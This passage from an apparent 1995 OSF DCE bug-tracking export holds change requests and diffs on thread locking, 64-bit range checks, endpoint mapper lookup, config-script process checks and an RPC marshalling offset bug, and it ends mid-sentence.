     *** 1351,1360 ****
     --- 1351,1367 ----
                           {
       		      dce_svc_printf(CDS_S_PTHREADCONDWAIT_A_MSG, (long)thstatus);
                           }
       		}
       		
     + 		ll_p->ll_state = ll_Off;
     + 
     + 	     	if ((thstatus = dthread_broadcast(&(ll_p->ll_state_changed))) < 0)
     +               	{
     + 		     dce_svc_printf(CDS_S_PTHREADCONDBROADCAST_A_MSG, 
     + 			             (long)thstatus);
     +                 }
       	    }
             
           
       	    
       
     ***************
     *** 1361,1382 ****
          /* End of the 'protected code' */
          if ((thstatus = dthread_unlock(&(ll_p->ll_mutex))) < 0)
          {
            dce_svc_printf(CDS_S_PTHREADMUTEXUNLOCK_A_MSG, (long)thstatus);
          }
     - 
     - 	ll_p->ll_state = ll_Off;
     - 	if (!dcond_equal(ll_p->ll_state_changed, dcond_null)) {
     -           {
     - 
     - 	     if ((thstatus = dthread_broadcast(&(ll_p->ll_state_changed))) < 0)
     -               {
     - 		dce_svc_printf(CDS_S_PTHREADCONDBROADCAST_A_MSG, 
     - 			       (long)thstatus);
     -               }
     -           }
     - 	}
       
       	if ((clerk_p = ll_p->ll_clerk_p) != NULL) {
       	    /*
       	     * Remove myself from the list
       	     */
     --- 1368,1377 ----
 
Related-file:::: Resolution 
 DESCRIPTION OF BUG FIX: Needed to hold lock around state setting and
 notify of condition.
  
  
 REGRESSION TEST SCENARIO: This one just showed up occasionally during
 system test.
  
  
 RCSDIFFS (either inserted manually or via Fci):



CR Number                     : 12816
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : osf1
Component Name                : dcecp
Subcomponent Name             : 
Short Description             : 64-bit incompatibility in is_number() function
Reported Date                 : 3/9/95
Found in Baseline             : 1.1, 1.2
Found Date                    : 3/9/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : rgy_utils.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/9/95 public]

is_number checks the range of a supplied (supposed) 32-bit attribute value
using strtol(3).  On a 64-bit system (DEC Alpha), strtol(3) accepts and
converts 64-bit values without complaint (long == 64 bits).  Some architecture-
independent mechanism should be used here to ensure that the supplied value
is within a 32-bit range.



CR Number                     : 12813
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : endpoint mapper
Short Description             : endpoint mapper not AES compliant
Reported Date                 : 3/3/95
Found in Baseline             : 1.1
Found Date                    : 3/3/95
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : admin/dced/server/oeops.c
Sensitivity                   : public

[3/3/95 public]

Ken Vineleaf at Digital found this problem.  

The fix (no I don't have a diff nor do I know who will be fixing this or
when) is that the map() routine in oeops.c should only fall into pass2 if
pass1 finds nothing.  NOT if pass1 finds less then max_ents.  Seiichi at
HP agrees with the diagnosis and fix.

This is also a problem in the map() routine of 1.0.3 rpcd (file
rpcdepdb.c).

Excerpts of Ken's mail follow.

>From vineleaf@microw.enet.dec.com Fri Feb 17 12:39:04 1995
  - 2 servers on the same node, both offering the same interface
  - Each server has its own object UUID
  - Both servers also register the NIL object UUID

After the first server (ServerA) starts up, the endpoint data base on the 
server node contains the following endpoints (among others):

  <object>         nil
  <interface id>   90E53BE1-2C49-11CE-80FE-08002B189651,1.0
  <string binding> ncacn_dnet_nsp:9.476[RPC40B0740001]
  <annotation>     ServerA

  <object>         36156366-41E4-11CE-82A2-08002B1BCD1E
  <interface id>   90E53BE1-2C49-11CE-80FE-08002B189651,1.0
  <string binding> ncacn_dnet_nsp:9.476[RPC40B0740001]
  <annotation>     ServerA

After the second server (ServerB) starts, the endpoint database contains the 
following endpoints (among others):

  <object>         nil
  <interface id>   90E53BE1-2C49-11CE-80FE-08002B189651,1.0
  <string binding> ncacn_dnet_nsp:9.476[RPC4270E20001]
  <annotation>     ServerB

  <object>         36156366-41E4-11CE-82A2-08002B1BCD1E
  <interface id>   90E53BE1-2C49-11CE-80FE-08002B189651,1.0
  <string binding> ncacn_dnet_nsp:9.476[RPC40B0740001]
  <annotation>     ServerA

  <object>         4C88B8FE-41FE-11CE-8C75-08002B1BCD1E
  <interface id>   90E53BE1-2C49-11CE-80FE-08002B189651,1.0
  <string binding> ncacn_dnet_nsp:9.476[RPC4270E20001]
  <annotation>     ServerB

Note that the endpoint with the nil object changed from ServerA to ServerB.
This is because our servers register their endpoints by calling rpc_ep_register
instead of calling rpc_register_no_replace.

Now suppose that I have a client that wants to call ServerA. It looks up ServerA
in the namespace, and it gets a partially bound handle to ServerA. The binding
handle contains ServerA's object UUID. To get ServerA's endpoint, the client
calls rpc_ep_resolve_binding resulting in an RPC to the endpoint mapper on the
target node. 

My question to you is: What endpoint(s) should the endpoint mapper return?

The algorithm described in the OSF DCE Application Development Guide (on 
page 14-29) states that when a client requests a non-nil object UUID, the
endpoint mapper searches for map elements with a matching object UUID and
interface UUID. If a match is found, then the endpoint is selected. It then 
goes on to say that if no map element contains both the object UUID and 
interface UUID, then the object UUID is discarded and the search starts over.

This suggests to me that the only endpoint that should be returned is this 
one:

  <object>         36156366-41E4-11CE-82A2-08002B1BCD1E
  <interface id>   90E53BE1-2C49-11CE-80FE-08002B189651,1.0
  <string binding> ncacn_dnet_nsp:9.476[RPC40B0740001]
  <annotation>     ServerA

In reality, however, the endpoint mapper is returning this endpoint *plus*
the endpoint for the matching interface and the nil object UUID. When 
rpc_ep_resolve_binding detects that more than one endpoint is returned, it
randomly chooses which endpoint it will use. This causes my client program
to randomly call ServerA or ServerB each time it is run, even though the
binding handle contains a handle to ServerA.

I have looked at the code (both the 1.0.3 and 1.1 code base) and found that
this is exactly what the code was designed to do. That is, is makes a two pass
search though the endpoint database whenever a non-nil object UUID is passed
to the endpoint mapper. The comments at the top of the code describe this
behavior. The code modules are RPCDEPDB.C and OEOPS.C, respectively. The
name of the routine that selects the endpoints is called "map".



CR Number                     : 12810
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : [un]config scripts
Short Description             : ps|grep not used correctly
Reported Date                 : 3/1/95
Found in Baseline             : 1.1
Found Date                    : 3/1/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 1.1maint
Affected File(s)              : dce_config
Sensitivity                   : public

[3/1/95 public]

Various shell scripts for configuring and unconfiguring dce/dfs use the
following command to check if a process is present:

	ps ${PSARGS} | grep -q PROCESSNAME

If $? is 0, they assume a success. If $0 is not 0, they assume nothing there.

The problem is that you need to get rid the grep process itself to be sure
to only grep the meaningful process information:

	ps ${PSARGS} | grep -v grep | grep -q PROCESSNAME

[01/22/96 public]

Lowered from A1 to B2 with team agreement

[01/24/96 public]

Applied proposed fix (with slight variations) to dce_config.

> ./config/dce_config
> Comparing revision 1.2.63.4 with revision 1.2.63.5.
> *** 1.2.63.4    1996/01/22 21:00:06
> --- 1.2.63.5    1996/01/22 21:45:21
> ***************
> *** 1064,1070 ****
>   
>       # Don't allow STOP before UNCONFIG: check that endpoint map is
>       # running, and if not, report error and return to menu.
> !     ps ${PSARGS} | grep -q $EPMAP
>       if [ $? -ne 0 ]; then
>         x_exit "DCE daemons must be running to unconfigure from the cell.  \
>   Run CONFIGURE or START.  Continuing will return to DCE Main Menu."
> --- 1068,1074 ----
>   
>       # Don't allow STOP before UNCONFIG: check that endpoint map is
>       # running, and if not, report error and return to menu.
> !     ps ${PSARGS} | grep $EPMAP | grep -v -q grep
>       if [ $? -ne 0 ]; then
>         x_exit "DCE daemons must be running to unconfigure from the cell.  \
>   Run CONFIGURE or START.  Continuing will return to DCE Main Menu."
> ***************
> *** 3460,3466 ****
>   
>     if [ "$sec_client_service" = "sec_clientd" ]
>     then
> !     ps ${PSARGS} | grep -q sec_clientd
>       if [ $? -eq 0 ]
>       then
>         return 1
> --- 3464,3470 ----
>   
>     if [ "$sec_client_service" = "sec_clientd" ]
>     then
> !     ps ${PSARGS} | grep sec_clientd | grep -v -q grep
>       if [ $? -eq 0 ]
>       then
>         return 1
> ***************
> *** 3716,3727 ****
>   {
>         log_msg DEBUG "Executing: config_epmap()"
>   
> !       ps ${PSARGS} | grep -q $EPMAP
>         if [ $? -ne 0 ]; then
>   
>                 # detect whether glbd is running.  Stop it if it is.
>                 glbd_running=0
> !               ps ${PSARGS} | grep -q glbd
>                 if [ $? -eq 0 ]; then
>                         glbd_running=1
>                         log_msg SUMMARY "Stopping glbd..."
> --- 3720,3731 ----
>   {
>         log_msg DEBUG "Executing: config_epmap()"
>   
> !       ps ${PSARGS} | grep $EPMAP | grep -v -q grep
>         if [ $? -ne 0 ]; then
>   
>                 # detect whether glbd is running.  Stop it if it is.
>                 glbd_running=0
> !               ps ${PSARGS} | grep glbd | grep -v -q grep
>                 if [ $? -eq 0 ]; then
>                         glbd_running=1
>                         log_msg SUMMARY "Stopping glbd..."
> ***************
> *** 3730,3736 ****
>                 fi
>   
>                 # detect whether llbd is running and stop it if it is
> !               ps ${PSARGS} | grep -q llbd
>                 if [ $? -eq 0 ]; then
>                         log_msg SUMMARY "Stopping llbd..."
>                         log_msg DETAIL "Executing: get_pid \"llbd\" | xargs kill
>  >/dev/null 2>&1"
> --- 3734,3740 ----
>                 fi
>   
>                 # detect whether llbd is running and stop it if it is
> !               ps ${PSARGS} | grep llbd | grep -v -q grep
>                 if [ $? -eq 0 ]; then
>                         log_msg SUMMARY "Stopping llbd..."
>                         log_msg DETAIL "Executing: get_pid \"llbd\" | xargs kill
>  >/dev/null 2>&1"
> ***************
> *** 3891,3897 ****
>   config_sec()
>   {
>         log_msg DEBUG "Executing: config_sec()"
> !       ps ${PSARGS} | grep -q secd
>         if [ $? -eq 0 ]
>         then
>             err_exit "Security server is already running on this node.  \
> --- 3895,3901 ----
>   config_sec()
>   {
>         log_msg DEBUG "Executing: config_sec()"
> !       ps ${PSARGS} | grep secd | grep -v -q grep
>         if [ $? -eq 0 ]
>         then
>             err_exit "Security server is already running on this node.  \
> ***************
> *** 4375,4381 ****
>       # If cdsadv is already running, it implies that this node may
>       # have been configured as a DCE client node.  In this case,
>       # we don't need to add CDS registry entries again.
> !     ps $PSARGS | grep -q cdsadv
>       if [ $? -ne 0 ]
>       then
>         log_msg VERBOSE "Adding entries for CDS to the registry database."
> --- 4379,4385 ----
>       # If cdsadv is already running, it implies that this node may
>       # have been configured as a DCE client node.  In this case,
>       # we don't need to add CDS registry entries again.
> !     ps $PSARGS | grep cdsadv | grep -v -q grep
>       if [ $? -ne 0 ]
>       then
>         log_msg VERBOSE "Adding entries for CDS to the registry database."
> ***************
> *** 4427,4433 ****
>         echo "cds.*.security.admin_group_name: $SUBSYSDIR/cds-admin" >> $DCELOCA
> L/etc/cds.conf
>   
>         # Start the CDS advertiser
> !       ps ${PSARGS} | grep -q cdsadv
>         if [ $? -eq 0 ]
>         then
>                 log_msg DEBUG "config_basecds: cdsadv is already running."
> --- 4431,4437 ----
>         echo "cds.*.security.admin_group_name: $SUBSYSDIR/cds-admin" >> $DCELOCA
> L/etc/cds.conf
>   
>         # Start the CDS advertiser
> !       ps ${PSARGS} | grep cdsadv | grep -v -q grep
>         if [ $? -eq 0 ]
>         then
>                 log_msg DEBUG "config_basecds: cdsadv is already running."
> ***************
> *** 4458,4464 ****
>   config_cds()
>   {
>         log_msg DEBUG "Executing: config_cds()"
> !       ps ${PSARGS} | grep -q cdsd
>         if [ $? -eq 0 ]
>         then
>             err_exit "CDS Server is already running on this node.  \
> --- 4462,4468 ----
>   config_cds()
>   {
>         log_msg DEBUG "Executing: config_cds()"
> !       ps ${PSARGS} | grep cdsd | grep -v -q grep
>         if [ $? -eq 0 ]
>         then
>             err_exit "CDS Server is already running on this node.  \
> ***************
> *** 4499,4505 ****
>   
>         # Start the cdsd daemon (with -a option)
>         log_msg SUMMARY "Starting cdsd..."
> !       ps ${PSARGS} | grep -q cdsd
>         if [ $? -eq 0 ]
>         then
>                 err_exit "cdsd is already running."
> --- 4503,4509 ----
>   
>         # Start the cdsd daemon (with -a option)
>         log_msg SUMMARY "Starting cdsd..."
> !       ps ${PSARGS} | grep cdsd | grep -v -q grep
>         if [ $? -eq 0 ]
>         then
>                 err_exit "cdsd is already running."
> ***************
> *** 5721,5727 ****
>         config_cdsclient
>   
>         # verify that node is now a CDS client
> !         ps ${PSARGS} | grep -q cdsadv
>         if [ $? -ne 0 ]
>         then
>                 err_exit "Failed to configure node as a CDS client.  This node \
> --- 5725,5731 ----
>         config_cdsclient
>   
>         # verify that node is now a CDS client
> !         ps ${PSARGS} | grep cdsadv | grep -v -q grep
>         if [ $? -ne 0 ]
>         then
>                 err_exit "Failed to configure node as a CDS client.  This node \
> ***************
> *** 5838,5844 ****
>   
>         # Start cdsd (withOUT the -a)
>         log_msg SUMMARY "Starting cdsd..."
> !         ps ${PSARGS} | grep -q cdsd
>         if [ $? = 0 ]
>         then
>                 err_exit "cdsd is already running.  \
> --- 5842,5848 ----
>   
>         # Start cdsd (withOUT the -a)
>         log_msg SUMMARY "Starting cdsd..."
> !         ps ${PSARGS} | grep cdsd | grep -v -q grep
>         if [ $? = 0 ]
>         then
>                 err_exit "cdsd is already running.  \
> ***************
> *** 5986,5992 ****
>         log_msg DEBUG "Executing: config_gda()"
>   
>         # verify gdad is not already running
> !       ps ${PSARGS} | grep -q gdad
>         if [ $? -eq 0 ]
>         then
>                 err_exit "gdad is already running."
> --- 5990,5996 ----
>         log_msg DEBUG "Executing: config_gda()"
>   
>         # verify gdad is not already running
> !       ps ${PSARGS} | grep gdad  | grep -v -q grep
>         if [ $? -eq 0 ]
>         then
>                 err_exit "gdad is already running."
> ***************
> *** 6013,6019 ****
>         fi
>   
>         # Ensure cds client has been enabled
> !       ps ${PSARGS} | grep -q cdsclerk
>         if [ $? -ne 0 ]
>         then
>                 err_exit "Node must be configured as a client before installing 
> a GDA server.  \
> --- 6017,6023 ----
>         fi
>   
>         # Ensure cds client has been enabled
> !       ps ${PSARGS} | grep cdsclerk  | grep -v -q grep
>         if [ $? -ne 0 ]
>         then
>                 err_exit "Node must be configured as a client before installing 
> a GDA server.  \
> ***************
> *** 6219,6225 ****
>   #------------------------------------------------------
>   config_cdsclient()
>   {
> !       ps ${PSARGS} | grep -q cdsadv
>         if [ $? -eq 0 ]
>         then
>                 return 1
> --- 6223,6229 ----
>   #------------------------------------------------------
>   config_cdsclient()
>   {
> !       ps ${PSARGS} | grep cdsadv  | grep -v -q grep
>         if [ $? -eq 0 ]
>         then
>                 return 1
> ***************
> *** 6242,6248 ****
>                 echo "cds.*.security.admin_group_name: $SUBSYSDIR/cds-admin" >> 
> $DCELOCAL/etc/cds.conf
>         fi
>   
> !       ps ${PSARGS} | grep -q cdsadv
>         if [ $? -eq 0 ]
>         then
>                 err_exit "cdsadv is already running."
> --- 6246,6252 ----
>                 echo "cds.*.security.admin_group_name: $SUBSYSDIR/cds-admin" >> 
> $DCELOCAL/etc/cds.conf
>         fi
>   
> !       ps ${PSARGS} | grep cdsadv  | grep -v -q grep
>         if [ $? -eq 0 ]
>         then
>                 err_exit "cdsadv is already running."
> ***************
> *** 6670,6676 ****
>                   { err_exit "sec_create_db may have failed to create security s
> lave"; }
>   
>         log_msg SUMMARY "Starting slave security server (secd) ..."
> !       ps ${PSARGS} | grep -q secd 
>         if [ $? -eq 0 ]
>         then
>                 err_exit "secd is already running."
> --- 6674,6680 ----
>                   { err_exit "sec_create_db may have failed to create security s
> lave"; }
>   
>         log_msg SUMMARY "Starting slave security server (secd) ..."
> !       ps ${PSARGS} | grep secd  | grep -v -q grep
>         if [ $? -eq 0 ]
>         then
>                 err_exit "secd is already running."
> ***************
> *** 6921,6927 ****
>         log_msg DEBUG "Executing: config_nulltimeprovider()"
>   
>           # Is a time provider already running on this node?
> !         ps ${PSARGS} | grep -q -e dts_null -e dts_ntp
>           if [ $? != 0 ]; then
>                 log_msg SUMMARY "Starting dts_null_provider..."
>                 log_msg DETAIL "Executing: dts_null_provider -p 60 -i 100"
> --- 6925,6931 ----
>         log_msg DEBUG "Executing: config_nulltimeprovider()"
>   
>           # Is a time provider already running on this node?
> !         ps ${PSARGS} | grep -e dts_null -e dts_ntp | grep -v -q grep
>           if [ $? != 0 ]; then
>                 log_msg SUMMARY "Starting dts_null_provider..."
>                 log_msg DETAIL "Executing: dts_null_provider -p 60 -i 100"
> ***************
> *** 6947,6953 ****
>         log_msg DEBUG "Executing: config_ntptimeprovider()"
>   
>           # Is a time provider already running on this node?
> !         ps ${PSARGS} | grep -q -e dts_null -e dts_ntp
>           if [ $? != 0 ]; then
>                 ntp_host=${NTP_HOST:="NULL"}
>                 until [ ${ntp_host:="NULL"} != "NULL" ]; do
> --- 6951,6957 ----
>         log_msg DEBUG "Executing: config_ntptimeprovider()"
>   
>           # Is a time provider already running on this node?
> !         ps ${PSARGS} | grep -e dts_null -e dts_ntp | grep -v -q grep
>           if [ $? != 0 ]; then
>                 ntp_host=${NTP_HOST:="NULL"}
>                 until [ ${ntp_host:="NULL"} != "NULL" ]; do
> ***************
> *** 6992,6998 ****
>         log_msg DEBUG "Executing: config_dtslocal()"
>   
>           # Is DTS already running?
> !         ps ${PSARGS} | grep -q dtsd
>           if [ $? != 0 ]; then
>                 dts_rgyinit
>   
> --- 6996,7002 ----
>         log_msg DEBUG "Executing: config_dtslocal()"
>   
>           # Is DTS already running?
> !         ps ${PSARGS} | grep dtsd | grep -v -q grep
>           if [ $? != 0 ]; then
>                 dts_rgyinit
>   
> ***************
> *** 7019,7025 ****
>         log_msg DEBUG "Executing: config_dtsglobal()"
>   
>           # Is DTS already running?
> !         ps ${PSARGS} | grep -q dtsd
>           if [ $? != 0 ]; then
>                 dts_rgyinit
>   
> --- 7023,7029 ----
>         log_msg DEBUG "Executing: config_dtsglobal()"
>   
>           # Is DTS already running?
> !         ps ${PSARGS} | grep dtsd  | grep -v -q grep
>           if [ $? != 0 ]; then
>                 dts_rgyinit
>   
> ***************
> *** 7044,7050 ****
>         log_msg DEBUG "Executing: config_dtsclerk()"
>   
>           # Is DTS already running?
> !         ps ${PSARGS} | grep -q dtsd
>           if [ $? != 0 ]; then
>                 start_dtsd clerk
>   
> --- 7048,7054 ----
>         log_msg DEBUG "Executing: config_dtsclerk()"
>   
>           # Is DTS already running?
> !         ps ${PSARGS} | grep dtsd | grep -v -q grep
>           if [ $? != 0 ]; then
>                 start_dtsd clerk
>   
> ***************
> *** 7078,7084 ****
>      else
>   
>         # Is this a security server?
> !       ps ${PSARGS} | grep -q secd
>         if [ $? != 0 ]
>         then
>                 # This configuration is needed because this node
> --- 7082,7088 ----
>      else
>   
>         # Is this a security server?
> !       ps ${PSARGS} | grep secd | grep -v -q grep
>         if [ $? != 0 ]
>         then
>                 # This configuration is needed because this node
> ***************
> *** 7103,7109 ****
>         fi
>   
>         # Is this a CDS server?
> !       ps ${PSARGS} | grep -q cdsd
>         if [ $? != 0 ]
>         then
>                 # Configure this node as a CDS client if cdsadv isn't running
> --- 7107,7113 ----
>         fi
>   
>         # Is this a CDS server?
> !       ps ${PSARGS} | grep cdsd | grep -v -q grep
>         if [ $? != 0 ]
>         then
>                 # Configure this node as a CDS client if cdsadv isn't running
> ***************
> *** 7118,7124 ****
>         fi
>   
>         # Has DTS been configured?
> !       ps ${PSARGS} | grep -q dtsd
>         if [ $? -ne 0 ]
>         then
>                 if [ -z "$DTS_CONFIG" ]
> --- 7122,7128 ----
>         fi
>   
>         # Has DTS been configured?
> !       ps ${PSARGS} | grep dtsd | grep -v -q grep
>         if [ $? -ne 0 ]
>         then
>                 if [ -z "$DTS_CONFIG" ]
> ***************
> *** 7188,7194 ****
>         else
>   
>                 # Is this a security server?
> !               ps ${PSARGS} | grep -q secd
>                 if [ $? != 0 ]; then
>                         # This configuration is needed because this machine is
>                         # not running the secd daemon, so isn't a sec server
> --- 7192,7198 ----
>         else
>   
>                 # Is this a security server?
> !               ps ${PSARGS} | grep secd | grep -v -q grep
>                 if [ $? != 0 ]; then
>                         # This configuration is needed because this machine is
>                         # not running the secd daemon, so isn't a sec server
> ***************
> *** 7210,7216 ****
>                 fi
>   
>                 # Is this a CDS server?
> !               ps ${PSARGS} | grep -q cdsd
>                 if [ $? != 0 ]; then
>                         # Configure this machine as a CDS client
>                         # if cdsadv isn't running
> --- 7214,7220 ----
>                 fi
>   
>                 # Is this a CDS server?
> !               ps ${PSARGS} | grep cdsd | grep -v -q grep
>                 if [ $? != 0 ]; then
>                         # Configure this machine as a CDS client
>                         # if cdsadv isn't running
> ***************
> *** 7337,7343 ****
>   {
>         log_msg DEBUG "Executing: config_audit()"
>   
> !       ps ${PSARGS} | grep -q auditd
>         if [ $? -eq 0 ]
>         then
>                 err_exit "Audit daemon is already running on this node. \
> --- 7341,7347 ----
>   {
>         log_msg DEBUG "Executing: config_audit()"
>   
> !       ps ${PSARGS} | grep auditd  | grep -v -q grep
>         if [ $? -eq 0 ]
>         then
>                 err_exit "Audit daemon is already running on this node. \
> ***************
> *** 7411,7417 ****
>       log_msg DEBUG "Executing: config_pwd_mgmt(${option})"
>   
>       if [ -z "${option}" ]; then
> !         ps ${PSARGS} | grep -q `basename ${PWD_MGMT_SVR}`
>           if [ $? -eq 0 ]
>           then
>               err_exit "Password Management Server is already running on this node.  \
> --- 7415,7421 ----
>       log_msg DEBUG "Executing: config_pwd_mgmt(${option})"
>   
>       if [ -z "${option}" ]; then
> !         ps ${PSARGS} | grep `basename ${PWD_MGMT_SVR}` | grep -v -q grep
>           if [ $? -eq 0 ]
>           then
>               err_exit "Password Management Server is already running on this node.  \
 
Fix submitted to dce1.1-maint.



CR Number                     : 12804
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : cds
Subcomponent Name             : 
Short Description             : BindChildDssd() is racey.
Reported Date                 : 2/23/95
Found in Baseline             : 1.1
Found Date                    : 2/23/95
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : cds/adver/adver_clerk.c
Sensitivity                   : public

[2/23/95 public]

 It is possible (in our kernel-threads environment on an 
 MP, at any rate), for multiple invocations of BindChildDssd()
 to run concurrently.  If they do so with the same uid/gid,
 as seen at startup time, more than one thread may decide that
 a child needs to be created.  They will use the same name for
 the socket in adver_open_socket(), and warning messages from
 that routine may appear. 
 
 We suggest adding a bit of serialization here.
     *** /tmp/ci.14019..adver_clerk.c.14055.1   Wed Feb  1 11:20:48 1995
     --- /tmp/adver_clerk.c.14055.2     Wed Feb  1 11:20:48 1995
     ***************
     *** 441,450 ****
     --- 441,466 ----
       
           DCE_SVC_DEBUG((cds__svc_handle, cds_svc_adver, svc_c_debug8,
                   " <client_cleanup(%p)", arg));
       }
       ^L
     + #ifdef hitm
     + static int BindCount;
     + static pthread_cond_t   BindCount_cond;
     + static boolean32        BindCount_inited;
     + static pthread_once_t   BindCount_once = pthread_once_init;
     + static void BindCount_init 
     + #ifndef __STDC__
     +    ( )
     + #else
     + ( void )
     + #endif
     + {
     + pthread_cond_init(&BindCount_cond, pthread_condattr_default);
     + BindCount_inited = true;
     + }
     + #endif
       /*
        * BindChild()
        *
        * Description:
        *     Looks to see if there is a child for this principal;
     ***************
     *** 484,494 ****
       
           /*
            * ok, look to see if we have a child for this prinicipal 
            */
           CDS_LOCK(listen_p->mutex)
     ! 
           for (child_p = listen_p->childList_p;  child_p; 
         child_p = child_p->next_p)
           {
       
        if ((bindMsg->hdr.infoLen == child_p->princLen) &&
     --- 500,515 ----
       
           /*
            * ok, look to see if we have a child for this prinicipal 
            */
           CDS_LOCK(listen_p->mutex)
     ! #ifdef hitm
     !     if (!BindCount_inited)
     !  pthread_once(&BindCount_once, BindCount_init);
     !     if (BindCount)
     !  pthread_cond_wait(&BindCount_cond, &listen_p->mutex);
     ! #endif
           for (child_p = listen_p->childList_p;  child_p; 
         child_p = child_p->next_p)
           {
       
        if ((bindMsg->hdr.infoLen == child_p->princLen) &&
     ***************
     *** 506,516 ****
        if (!child_p)
            do
                num = ++listen_p->lastnum;
            while (num == 0);
           }
     ! 
           CDS_END_LOCK(listen_p->mutex)
       
           /*
            * nope, better make one 
            */
     --- 527,539 ----
        if (!child_p)
            do
                num = ++listen_p->lastnum;
            while (num == 0);
           }
     ! #ifdef hitm
     !     if (!child_p) BindCount++;
     ! #endif
           CDS_END_LOCK(listen_p->mutex)
       
           /*
            * nope, better make one 
            */
     ***************
     *** 639,651 ****
         * there are cases where the name was passed back
         * to the library before it was created.
         */
        if ((cfd = adver_open_socket(&child_p->saddr, 5)) < 0) {
            status = DNS_UNIXERRORS + errno;
            goto leave_BindChildDssd;
        }
     - 
        (void)chown(child_p->saddr.sun_path, uid, gid);
        (void)chmod(child_p->saddr.sun_path, 0400|0200);
       
        /*      For SVR4, it is not necessary to do this since cma_fork()
and
         *      cma_exec*() do the right things.
     --- 662,679 ----
         * there are cases where the name was passed back
         * to the library before it was created.
         */
        if ((cfd = adver_open_socket(&child_p->saddr, 5)) < 0) {
            status = DNS_UNIXERRORS + errno;
     + #ifdef hitm
     +              CDS_LOCK(listen_p->mutex)
     +              BindCount--;
     +              pthread_cond_signal(&BindCount_cond);
     +      CDS_END_LOCK(listen_p->mutex)
     + #endif
            goto leave_BindChildDssd;
        }
        (void)chown(child_p->saddr.sun_path, uid, gid);
        (void)chmod(child_p->saddr.sun_path, 0400|0200);
       
        /*      For SVR4, it is not necessary to do this since cma_fork()
and
         *      cma_exec*() do the right things.
     ***************
     *** 751,761 ****
       
             CDS_LOCK(listen_p->mutex)
       
             child_p->next_p = listen_p->childList_p;
             listen_p->childList_p = child_p;
     ! 
             CDS_END_LOCK(listen_p->mutex)
       
        /*
         * Unblock SIGCHiLD - this needs to be after the last reference
         * of child_p.  This is because adver_clerk_signal() can deallocate
     --- 779,792 ----
       
             CDS_LOCK(listen_p->mutex)
       
             child_p->next_p = listen_p->childList_p;
             listen_p->childList_p = child_p;
     ! #ifdef hitm
     !       BindCount--;
     !       pthread_cond_signal(&BindCount_cond);
     ! #endif
             CDS_END_LOCK(listen_p->mutex)
       
        /*
         * Unblock SIGCHiLD - this needs to be after the last reference
         * of child_p.  This is because adver_clerk_signal() can deallocate



CR Number                     : 12800
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl runtime or specifically 
marshalling
Short Description             : marshalled data is offset during
a RPC authenticated call.
on
Reported Date                 : 2/22/95
Found in Baseline             : 1.1
Found Date                    : 2/22/95
Severity                      : B
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/22/95 public]

An offset problem occurs when executing an authenticated call from a client to 
a server using "udp".The idl file in this case defines an input character array 
from the client and an output character array from the server.  The offset
does not occur to the data received by the server, but the data sent by the
server to the client.  The effects of this problem varies, depending upon the
arguments stated in the idl file.  One effect is rpc runtime returning a
"Stub or runtime protocol error (dce/rpc)" status to the client.  Another 
effect is missing characters in the client's string received from the server.

After investigating the problem, the root cause of the error is due to the
adjustment of the data_length perfomed in the rpc__dg_xmitq_append_pp routine.
This adjustment is needed for data encryption which depend on data_lengths to 
be in 8 byte blocks. The adjustment is made only if the call is authenicated 
and the data_length is not a multiple of 8.  In the case stated previously the 
length of the arrays are not a multiple of 8 and therefore will require
adjustment if the client performs an authenticated call.  Once the server 
receives the adjusted data, the server stub will then unmarshall the input 
arguments by executing rpc_ss_ndr_unmar_interp.  Returning from this routine
results in extra bytes of data ignored by the unmarshall.  This result is
reflected in the structure variable IDL_ms->IDL_left_in_buff. The value of 
this variable is equal to the adjustment made by the client during the 
rpc__dg_xmitq_append_pp routine.  This variable IDL_ms->IDL_left_in_buff is
again used in the server stub during the  rpc_ss_ndr_marsh_interp routine. The 
actual incorrect offset takes place in the rpc_ss_ndr_marsh_by_copying routine
which checks IDL_ms->IDL_left_in_buff to determine the amount of bytes to
memcpy from the fixed array into the data buffer. Since the value of 
IDL_ms->IDL_left_in_buff is not 0 rpc_ss_ndr_marsh_by_copying will try to
use the remaining buffer and supposedly transmit the full buffer.  The 
transmission will not take place since IDL_msp->IDL_buff_addr=NULL,
therefore, the server will lose the data and introduce an offset into the
data sent to the client. 

One solution is to intialize IDL_ms->IDL_left_in_buff back to zero once
the rpc_ss_ndr_unmar_interp routine has deallocated 
IDL_msp->IDL_elt_p->buff_addr and set IDL_msp->IDL_elt_p=NULL.

A question arises whether unmarshall should handle the adjusted data
or should the executor thread re-adjust the data_length before calling the
server stub???

[2/23/95 public]

During the dce1.1 development, I saw this problem. (It gave me a coredump
because of the null pointer.) But for some reason which I can't recall, it
wasn't considered as a bug. (It is not supposed to happen? It didn't happen
to me after I cleaned up the DG MBF codes.) I'll try to dig up my memory.
(It was the last spring. Something with SPI?)

As for the above question, it is the stub's (thus, unmarshalling engine)
responsibility to discard the unwanted data at the end because it knows
exactly how many bytes it is receiving. Clearly, IDL_ms->IDL_left_in_buff
should be reset to zero when the turnaround happens. The receiver's rpc
runtime doesn't know whether or not the sender's runtime adjusted the data
